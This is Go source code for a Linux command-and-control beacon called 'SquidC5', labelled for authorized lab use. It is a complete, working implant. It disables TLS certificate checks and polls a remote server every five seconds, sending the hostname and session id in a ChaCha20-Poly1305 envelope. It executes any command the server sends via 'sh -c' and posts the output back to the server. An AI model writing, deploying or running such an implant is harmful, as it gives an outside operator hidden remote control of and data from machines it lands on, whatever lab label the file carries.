// SquidC5 native Linux beacon v1 (authorized lab only).
// Build: go build -o sc5beacon .
// Usage: SC5_PSK=... SC5_URL=https://host:8443/api/v1/implant/beacon ./sc5beacon
package main

import (
	"bytes"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"time"

	"golang.org/x/crypto/chacha20poly1305"
)

func b64e(b []byte) string { return base64.RawURLEncoding.EncodeToString(b) }
func b64d(s string) ([]byte, error) { return base64.RawURLEncoding.DecodeString(s) }

func seal(psk string, obj map[string]any) (map[string]any, error) {
	key := sha256.Sum256([]byte(psk))
	aead, err := chacha20poly1305.New(key[:])
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, chacha20poly1305.NonceSize)
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	pt, _ := json.Marshal(obj)
	ct := aead.Seal(nil, nonce, pt, nil)
	return map[string]any{"v": 1, "alg": "chacha20-poly1305", "n": b64e(nonce), "c": b64e(ct)}, nil
}

func openEnv(psk string, env map[string]any) (map[string]any, error) {
	key := sha256.Sum256([]byte(psk))
	aead, err := chacha20poly1305.New(key[:])
	if err != nil {
		return nil, err
	}
	n, err := b64d(fmt.Sprint(env["n"]))
	if err != nil {
		return nil, err
	}
	c, err := b64d(fmt.Sprint(env["c"]))
	if err != nil {
		return nil, err
	}
	pt, err := aead.Open(nil, n, c, nil)
	if err != nil {
		return nil, err
	}
	var out map[string]any
	return out, json.Unmarshal(pt, &out)
}

func main() {
	url := os.Getenv("SC5_URL")
	psk := os.Getenv("SC5_PSK")
	if url == "" || psk == "" {
		fmt.Fprintln(os.Stderr, "SC5_URL and SC5_PSK required")
		os.Exit(1)
	}
	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}} // lab
	client := &http.Client{Timeout: 30 * time.Second, Transport: tr}
	var sid any
	host, _ := os.Hostname()
	for {
		body, err := seal(psk, map[string]any{"session_id": sid, "hostname": host})
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		raw, _ := json.Marshal(body)
		resp, err := client.Post(url, "application/json", bytes.NewReader(raw))
		if err == nil {
			b, _ := io.ReadAll(resp.Body)
			resp.Body.Close()
			var env map[string]any
			if json.Unmarshal(b, &env) == nil {
				if plain, err := openEnv(psk, env); err == nil {
					if s, ok := plain["session_id"]; ok {
						sid = s
					}
					if task, ok := plain["task"].(map[string]any); ok && task != nil {
						cmd, _ := task["command"].(string)
						id, _ := task["id"].(string)
						out, _ := exec.Command("sh", "-c", cmd).CombinedOutput()
						done, _ := seal(psk, map[string]any{"task_id": id, "result": string(out), "status": "completed"})
						dr, _ := json.Marshal(done)
						r2, err2 := client.Post(url+"/result", "application/json", bytes.NewReader(dr))
						if err2 == nil {
							r2.Body.Close()
						}
					}
				}
			}
		}
		time.Sleep(5 * time.Second)
	}
}
